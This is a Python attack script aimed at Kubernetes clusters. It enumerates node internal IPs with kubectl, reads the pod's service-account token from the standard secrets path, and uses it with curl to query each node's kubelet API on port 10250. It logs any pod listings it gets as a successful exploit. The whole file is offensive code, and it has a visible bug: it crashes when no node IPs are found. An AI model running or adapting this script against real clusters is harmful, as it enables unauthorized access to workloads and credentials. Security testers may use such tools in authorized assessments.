#!/usr/bin/env python3
import os
import subprocess
import json

LOG_DIR = "/usr/local/bin/logs"
os.makedirs(LOG_DIR, exist_ok=True)

def write_to_log(filename, content):
    with open(filename, "a") as log_file:
        log_file.write(content + "\n")

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("utf-8")
        return output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('utf-8')}"

def get_internal_ips_from_json():
    print("[+] Fetching node information via JSON...")
    command = "kubectl get nodes -o json"
    output = run_command(command)

    if "Forbidden" in output:
        print("[-] Access to nodes forbidden. Cannot retrieve InternalIP.")
        write_to_log(os.path.join(LOG_DIR, "attack_log.log"), "Access to nodes forbidden. Cannot retrieve InternalIP.")
        return None

    write_to_log(os.path.join(LOG_DIR, "kubelet_nodes_raw.json"), output)
    print("[+] Nodes JSON information saved to kubelet_nodes_raw.json")

    # Извлечение IP-адресов
    try:
        nodes_data = json.loads(output)
        internal_ips = []
        for item in nodes_data.get("items", []):
            node_name = item.get("metadata", {}).get("name", "Unknown")
            for address in item.get("status", {}).get("addresses", []):
                if address.get("type") == "InternalIP":
                    ip = address.get("address")
                    internal_ips.append(ip)
                    write_to_log(os.path.join(LOG_DIR, "attack_log.log"), f"Found Kubelet: {node_name} with IP {ip}")
                    print(f"[+] Found InternalIP for node {node_name}: {ip}")

        if not internal_ips:
            print("[-] No InternalIP addresses found.")
            write_to_log(os.path.join(LOG_DIR, "attack_log.log"), "No InternalIP addresses found.")
            return None
        print(f"[+] All InternalIP addresses: {internal_ips}")
        return internal_ips
    except json.JSONDecodeError as e:
        print(f"[-] Error parsing JSON: {e}")
        write_to_log(os.path.join(LOG_DIR, "attack_log.log"), f"Error parsing JSON: {e}")
        return None

def access_kubelet_api(ip_addresses):
    print("[+] Checking access to Kubelet API...")
    for ip in ip_addresses:
        kubelet_url = f"https://{ip}:10250/pods"
        print(f"[+] Attempting to access Kubelet API at {kubelet_url}...")
        command = f"curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" {kubelet_url}"
        output = run_command(command)

        if "Forbidden" in output:
            print(f"[-] Access to Kubelet API at {ip} is forbidden.")
            write_to_log(os.path.join(LOG_DIR, "attack_log.log"), f"Access to Kubelet API at {ip} is forbidden.")
        elif output.strip():
            print(f"[+] Successfully accessed Kubelet API at {ip}.")
            write_to_log(os.path.join(LOG_DIR, "attack_log.log"), f"Successfully accessed Kubelet API at {ip}. Output saved.")
            write_to_log(os.path.join(LOG_DIR, f"kubelet_api_{ip}.log"), output)
        else:
            print(f"[-] No response from Kubelet API at {ip}.")
            write_to_log(os.path.join(LOG_DIR, "attack_log.log"), f"No response from Kubelet API at {ip}.")

def evaluate_attack_applicability(ip_addresses):
    print("[+] Evaluating attack applicability...")
    success = False
    for ip in ip_addresses:
        kubelet_url = f"https://{ip}:10250/pods"
        command = f"curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" {kubelet_url}"
        output = run_command(command)
        if "Forbidden" not in output and output.strip():
            success = True
            break

    if success:
        print("[+] Access Kubelet API exploited. Attack vector successfully applicable.")
        write_to_log(os.path.join(LOG_DIR, "attack_log.log"), f"[MTKPI: Access Kubelet API Exploited]")
        write_to_log(os.path.join(LOG_DIR, "attack_log.log"), f"Node IPs: {ip_addresses}") 
        return "Successfully exploited"
    else:
        print("[-] Access to Kubelet API forbidden. Attack vector not applicable.")
        write_to_log(os.path.join(LOG_DIR, "access_kubelet_log.log"), f"Access to Kubelet API forbidden. Node IPs: {ip_addresses}")
        return "Not applicable"

def strict_recon():
    print("[+] Starting strict reconnaissance...")
    write_to_log(os.path.join(LOG_DIR, "attack_log.log"), "[+] Starting strict reconnaissance...")
    ip_addresses = get_internal_ips_from_json()
    if not ip_addresses:
        evaluate_attack_applicability(None)
        return

    access_kubelet_api(ip_addresses)
    evaluate_attack_applicability(ip_addresses)
    print("[+] Access Kubelet API phase completed.")
    write_to_log(os.path.join(LOG_DIR, "attack_log.log"), "[+] Reconnaissance completed.")

if __name__ == "__main__":
    strict_recon()

